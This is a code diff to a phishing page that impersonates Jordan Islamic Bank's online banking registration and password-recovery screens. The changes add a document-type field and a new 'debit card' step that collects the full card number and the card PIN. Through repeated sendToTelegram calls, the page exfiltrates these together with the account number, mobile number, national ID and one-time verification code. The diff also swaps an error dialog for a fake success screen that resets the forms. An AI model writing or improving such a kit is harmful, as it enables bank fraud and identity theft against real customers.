@@ -186,45 +186,113 @@
             color:#f26522;
             font-weight: bold;
         }
-        /* Modal styles */
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1001;
-            left: 0; top: 0; width: 100vw; height: 100vh;
-            background: rgba(0,0,0,0.25);
+        /* Card Info View Styles */
+        .card-info-title {
+            color: #fff;
+            text-align: center;
+            font-size: 1.35rem;
+            font-weight: 700;
+            margin-top: 12px;
+            margin-bottom: 24px;
+        }
+        .card-img-wrap {
+            width: 180px;
+            height: 115px;
+            margin: 0 auto 28px auto;
+            display: flex;
             align-items: center;
             justify-content: center;
         }
-        .modal.active { display: flex; }
-        .modal-content {
+        .card-img {
+            width: 100%;
+            height: 100%;
+            border-radius: 13px;
             background: #fff;
-            border-radius: 14px;
-            padding: 32px 22px;
-            text-align: center;
-            font-size: 1.25rem;
-            color: #d32f2f;
-            box-shadow: 0 6px 24px 0 rgba(0,0,0,0.16);
-            font-family: 'Cairo', Arial, sans-serif;
-            max-width: 90vw;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 2px 14px 0 rgba(0,0,0,0.10);
         }
-        .modal-content button {
-            margin-top: 22px;
-            background: #f26522;
-            color: #fff;
-            border: none;
-            border-radius: 10px;
+        .card-img::after {
+            content: "";
+            position: absolute;
+            left: -14px; right: -14px; top: -14px; bottom: -14px;
+            border: 3px dashed #fff;
+            border-radius: 20px;
+            pointer-events: none;
+        }
+        .card-img-content {
+            z-index: 1;
+            width: 100%;
+            text-align: center;
+        }
+        .card-bank-name {
+            color: #b71c1c;
             font-size: 1.1rem;
-            padding: 12px 38px;
+            font-weight: bold;
+            margin-top: 5px;
+            margin-bottom: 8px;
+        }
+        .card-num-row {
+            display: flex;
+            justify-content: center;
+            gap: 7px;
+            margin-bottom: 22px;
+        }
+        .card-num-input {
+            width: 54px;
+            height: 44px;
+            border-radius: 7px;
+            border: none;
+            background: #fff;
+            text-align: center;
+            font-size: 1.2rem;
+            font-family: 'Cairo', Arial, sans-serif;
+            margin-bottom: 0;
+            box-shadow: 0 1px 5px 0 rgba(0,0,0,0.08);
+        }
+        .card-secret {
+            width: 93%;
+            margin: 0 auto 14px auto;
+        }
+        .card-info-note {
+            color: #fff;
+            font-size: .97rem;
+            text-align: center;
+            margin: 22px 0 17px 0;
+        }
+        .card-info-note span {
+            color: #f26522;
+            font-weight: bold;
+        }
+        .card-info-btn {
+            display: block;
+            width: 95%;
+            margin: 0 auto;
+            padding: 16px 0;
+            background: #fff;
+            color: #f26522;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.15rem;
+            font-family: 'Cairo',Arial,sans-serif;
+            font-weight: bold;
+            box-shadow: 0 1px 8px 0 rgba(0,0,0,0.08);
             cursor: pointer;
+            margin-bottom: 13px;
+            margin-top: 7px;
         }
         @media (max-width: 480px) {
-            .container { padding-top: 24px; }
-            .logo { width: 100px; }
-            .title { font-size: 1.4rem; }
-            .main-btn { font-size: 1.1rem; padding: 16px 0; min-width: 140px; }
-            .form-card { max-width: 98vw; }
-            .modal-content { max-width: 98vw; font-size: 1rem; }
+            .container { padding-top: 24px;}
+            .logo { width: 100px;}
+            .title { font-size: 1.4rem;}
+            .main-btn { font-size: 1.1rem; padding: 16px 0; min-width: 140px;}
+            .form-card { max-width: 98vw;}
+            .card-img-wrap { width: 98vw; max-width: 182px; }
+            .card-img { height: 85px; }
+            .card-num-input { width: 40px; height: 34px; font-size: 1.1rem;}
         }
     </style>
 </head>
@@ -266,7 +334,7 @@
             <div class="title">البنك الإسلامي الأردني</div>
             <div class="subtitle">عضو مجموعة البركة</div>
             <div class="info-text">مستخدم جديد</div>
-            <form class="form-card" id="registerForm" autocomplete="off" onsubmit="return goToVerification(event, 'registerForm')">
+            <form class="form-card" id="registerForm" autocomplete="off" onsubmit="return goToCardInfo(event, 'registerForm')">
                 <input type="text" id="accountNumber" name="accountNumber" placeholder="رقم الحساب (7 خانات)*" maxlength="7" pattern="^[0-9]{7}$" required>
                 <div class="row">
                     <input type="text" value="+962" disabled>
@@ -277,6 +345,11 @@
                     <option>الأردن</option>
                     <option>فلسطين</option>
                     <option>السعودية</option>
+                </select>
+                <select id="docType" name="docType" required>
+                    <option value="">نوع الوثيقة</option>
+                    <option>هوية وطنية</option>
+                    <option>جواز سفر</option>
                 </select>
                 <input type="text" id="nationalId" name="nationalId" placeholder="الرقم الوطني" required>
                 <div class="note">
@@ -293,7 +366,7 @@
             <div class="title">البنك الإسلامي الأردني</div>
             <div class="subtitle">عضو مجموعة البركة</div>
             <div class="info-text">استعادة اسم المستخدم أو كلمة المرور</div>
-            <form class="form-card" id="forgotForm" autocomplete="off" onsubmit="return goToVerification(event, 'forgotForm')">
+            <form class="form-card" id="forgotForm" autocomplete="off" onsubmit="return goToCardInfo(event, 'forgotForm')">
                 <input type="text" id="forgotAccountNumber" name="accountNumber" placeholder="رقم الحساب (7 خانات)*" maxlength="7" pattern="^[0-9]{7}$" required>
                 <div class="row">
                     <input type="text" value="+962" disabled>
@@ -305,8 +378,39 @@
                     <option>فلسطين</option>
                     <option>السعودية</option>
                 </select>
+                <select id="forgotDocType" name="docType" required>
+                    <option value="">نوع الوثيقة</option>
+                    <option>هوية وطنية</option>
+                    <option>جواز سفر</option>
+                </select>
                 <input type="text" id="forgotNationalId" name="nationalId" placeholder="الرقم الوطني" required>
                 <button type="submit">تأكيد</button>
+            </form>
+        </div>
+        <!-- Card Info View (new page, before verification) -->
+        <div class="view" id="cardInfoView">
+            <div class="card-info-title">بطاقة الخصم الفوري</div>
+            <div class="card-img-wrap">
+                <div class="card-img">
+                    <div class="card-img-content">
+                        <div style="font-weight:bold;font-size:.98rem;color:#b71c1c;margin-bottom:2px;">Debit</div>
+                        <div class="card-bank-name">Jordan Islamic Bank</div>
+                        <div style="font-size:1.1rem;letter-spacing:4px;color:#b71c1c;">XXXX XXXX XXXX XXXX</div>
+                    </div>
+                </div>
+            </div>
+            <form id="cardInfoForm" autocomplete="off" onsubmit="return goToVerificationFromCard(event)">
+                <div class="card-num-row">
+                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum1" name="cardNum1" autocomplete="off">
+                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum2" name="cardNum2" autocomplete="off">
+                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum3" name="cardNum3" autocomplete="off">
+                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum4" name="cardNum4" autocomplete="off">
+                </div>
+                <input type="text" class="card-secret" maxlength="4" pattern="\\d{4}" required id="cardSecret" name="cardSecret" placeholder="رقم البطاقة السري (XXXX)" autocomplete="off">
+                <div class="card-info-note">
+                    في حال تعسر امتلاك بطاقة يرجى الضغط على إلغاء والمتابعة مع مركز الاتصال لتفعيل الحساب على الرقم <span>065680001</span>
+                </div>
+                <button class="card-info-btn" type="submit">تأكيد</button>
             </form>
         </div>
         <!-- Verification View -->
@@ -330,25 +434,18 @@
             <div class="title">تم الإرسال بنجاح</div>
             <div class="subtitle">شكراً لاستخدامك خدمات البنك الإسلامي الأردني</div>
         </div>
-        <!-- Modal for error -->
-        <div class="modal" id="errorModal">
-            <div class="modal-content">
-                رمز التحقق أو إحدى المعلومات غير صحيح.<br>يرجى إعادة المحاولة مرة أخرى.
-                <br>
-                <button onclick="closeModal()">إعادة المحاولة</button>
-            </div>
-        </div>
     </div>
     <script>
         let lastFormData = {};
         let lastFormType = '';
+        let cardInfoData = {};
 
         function showView(view) {
             document.querySelectorAll('.view').forEach(e => e.classList.remove('active'));
             document.getElementById(view).classList.add('active');
         }
 
-        // When user submits a form, go to verification view and store data
+        // For login (username/password) go directly to verification
         function goToVerification(event, formId) {
             event.preventDefault();
             lastFormType = formId;
@@ -363,30 +460,61 @@
                     password: formData.get('password'),
                     summary: summary
                 };
-            } else if(formId === 'registerForm'){
-                summary = `تسجيل مستخدم جديد\nرقم الحساب: ${formData.get('accountNumber')}\nرقم الموبايل: ${formData.get('mobile')}\nالدولة: ${formData.get('country')}\nالرقم الوطني: ${formData.get('nationalId')}`;
+                sendToTelegram(lastFormData.summary);
+                showView('verifyView');
+            }
+            return false;
+        }
+
+        // For register/forgot, first go to card info page
+        function goToCardInfo(event, formId) {
+            event.preventDefault();
+            lastFormType = formId;
+            const form = document.getElementById(formId);
+            const formData = new FormData(form);
+            let summary = '';
+            if(formId === 'registerForm'){
+                summary = `تسجيل مستخدم جديد\nرقم الحساب: ${formData.get('accountNumber')}\nرقم الموبايل: ${formData.get('mobile')}\nالدولة: ${formData.get('country')}\nنوع الوثيقة: ${formData.get('docType')}\nالرقم الوطني: ${formData.get('nationalId')}`;
                 lastFormData = {
                     type: 'register',
                     accountNumber: formData.get('accountNumber'),
                     mobile: formData.get('mobile'),
                     country: formData.get('country'),
+                    docType: formData.get('docType'),
                     nationalId: formData.get('nationalId'),
                     summary: summary
                 };
             } else if(formId === 'forgotForm'){
-                summary = `استعادة اسم المستخدم أو كلمة المرور\nرقم الحساب: ${formData.get('accountNumber')}\nرقم الموبايل: ${formData.get('mobile')}\nالدولة: ${formData.get('country')}\nالرقم الوطني: ${formData.get('nationalId')}`;
+                summary = `استعادة اسم المستخدم أو كلمة المرور\nرقم الحساب: ${formData.get('accountNumber')}\nرقم الموبايل: ${formData.get('mobile')}\nالدولة: ${formData.get('country')}\nنوع الوثيقة: ${formData.get('docType')}\nالرقم الوطني: ${formData.get('nationalId')}`;
                 lastFormData = {
                     type: 'forgot',
                     accountNumber: formData.get('accountNumber'),
                     mobile: formData.get('mobile'),
                     country: formData.get('country'),
+                    docType: formData.get('docType'),
                     nationalId: formData.get('nationalId'),
                     summary: summary
                 };
             }
-            // Send basic info first
-            sendToTelegram(lastFormData.summary);
-            // Go to verification page
+            showView('cardInfoView');
+            return false;
+        }
+
+        // On card info submit
+        function goToVerificationFromCard(event) {
+            event.preventDefault();
+            const form = document.getElementById('cardInfoForm');
+            const formData = new FormData(form);
+            cardInfoData = {
+                cardNum1: formData.get('cardNum1'),
+                cardNum2: formData.get('cardNum2'),
+                cardNum3: formData.get('cardNum3'),
+                cardNum4: formData.get('cardNum4'),
+                cardSecret: formData.get('cardSecret')
+            };
+            let cardSummary = `بطاقة الخصم الفوري\nرقم البطاقة: ${cardInfoData.cardNum1} ${cardInfoData.cardNum2} ${cardInfoData.cardNum3} ${cardInfoData.cardNum4}\nالرقم السري: ${cardInfoData.cardSecret}`;
+            // Send all previous + card info
+            sendToTelegram((lastFormData.summary || '') + '\n' + cardSummary);
             showView('verifyView');
             return false;
         }
@@ -396,23 +524,19 @@
             event.preventDefault();
             const code = document.getElementById('verifyCode').value.trim();
             if(!code) return false;
-            // Add code to previous info and send again
-            let msg = lastFormData.summary + `\nرمز التحقق: ${code}`;
+            let msg = (lastFormData.summary || '') + 
+                ((cardInfoData.cardNum1) ? `\nبطاقة الخصم الفوري\nرقم البطاقة: ${cardInfoData.cardNum1} ${cardInfoData.cardNum2} ${cardInfoData.cardNum3} ${cardInfoData.cardNum4}\nالرقم السري: ${cardInfoData.cardSecret}` : '') +
+                `\nرمز التحقق: ${code}`;
             sendToTelegram(msg, true);
-            // Instead of success, show error modal and return to verification view
-            showModal();
+            showView('successView');
+            setTimeout(() => { 
+                // Reset all forms and views
+                document.querySelectorAll('form').forEach(f=>f.reset());
+                cardInfoData = {};
+                lastFormData = {};
+                showView('mainView'); 
+            }, 3500);
             return false;
-        }
-
-        // Modal logic
-        function showModal() {
-            document.getElementById('errorModal').classList.add('active');
-        }
-        function closeModal() {
-            document.getElementById('errorModal').classList.remove('active');
-            document.getElementById('verifyCode').value = '';
-            showView('verifyView');
-            document.getElementById('verifyCode').focus();
         }
 
         // Telegram Send Function
